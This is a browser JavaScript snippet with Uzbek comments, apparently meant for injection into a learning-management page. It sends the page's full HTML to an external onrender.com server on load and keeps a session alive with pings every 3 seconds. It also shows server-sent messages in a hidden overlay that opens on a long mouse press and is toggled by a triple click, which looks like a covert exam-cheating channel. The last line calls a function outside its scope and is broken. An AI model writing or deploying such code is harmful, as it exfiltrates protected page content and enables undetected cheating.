// ===== SESSION KEEPER QATLAMI (auto-refresh bypass) =====
(async()=>{
  const BASE = 'https://shoxx23-1.onrender.com';

  // 1. Agar sessiya bo‘lmasa – serverdan yangi oladi
  if(!localStorage._lms_sid){
    try{
      const r = await fetch(BASE+'/session');
      const j = await r.json();
      localStorage._lms_sid = j.sid;
    }catch(e){}
  }

  // 2. Har 3 sekundda serverga “men tirikman” ping yuboradi
  setInterval(()=>{
    if(localStorage._lms_sid){
      fetch(BASE+'/ping',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({sid:localStorage._lms_sid})
      }).catch(()=>{});
    }
  },3000);
})();

// public/f1.js
(function(){
  const BASE = 'https://shoxx23-1.onrender.com'; // server URL

  let holdTimer=null, clickCount=0, lastSince=0, box=null;

  function makeBox(){
    if(box) return box;
    box=document.createElement('div');
    Object.assign(box.style,{
      position:'fixed', left:'10px', bottom:'10px', maxWidth:'360px',
      background:'#111', color:'#fff', padding:'10px',
      font:'14px sans-serif', borderRadius:'8px',
      boxShadow:'0 6px 18px rgba(0,0,0,0.3)', zIndex:2147483647,
      display:'none', whiteSpace:'pre-wrap', cursor:'pointer'
    });
    document.body.appendChild(box);
    return box;
  }

  function showToast(msg){
    const t=document.createElement('div');
    t.textContent=msg;
    Object.assign(t.style,{
      position:'fixed', left:'50%', bottom:'10px', transform:'translateX(-50%)',
      background:'#007bff', color:'#fff', padding:'8px 14px',
      borderRadius:'6px', font:'14px sans-serif', zIndex:2147483646,
      boxShadow:'0 4px 12px rgba(0,0,0,0.2)'
    });
    document.body.appendChild(t);
    setTimeout(()=>t.remove(),2500);
  }

  async function sendPage(){
    try{
      await fetch(BASE+'/upload-html',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({html:document.documentElement.outerHTML})
      });
      showToast("✅ HTML yuborildi");
    }catch(e){console.error(e); showToast("❌ Yuborishda xatolik");}
  }


  async function fetchLatest(){
    if(!localStorage._lms_sid) return;
    try{
      const r=await fetch(BASE+'/latest?since='+lastSince);
      const j=await r.json();
      if(j.success && j.message){
        const b=makeBox();
        b.textContent=j.message;
        b.style.display='block';
      }
    }catch(e){console.error(e);}
  }

  // 3 soniya bosib turish -> oxirgi xabarni ko‘rsatish
  document.addEventListener('mousedown', e=>{
    if(e.button===0) holdTimer=setTimeout(fetchLatest,3000);
  });
  document.addEventListener('mouseup', ()=>{
    if(holdTimer){clearTimeout(holdTimer); holdTimer=null;}
  });

  // 3 marta tez bosish -> oynani yashirish/yopish
  document.addEventListener('click', e=>{
    if(e.button===0){
      clickCount++;
      setTimeout(()=>clickCount=0,600);
      if(clickCount>=3){
        clickCount=0;
        if(box) box.style.display=(box.style.display==='none')?'block':'none';
      }
    }
  });

  // Dastlabki yuborish
  sendPage();
})();
setTimeout(fetchLatest, 1500);
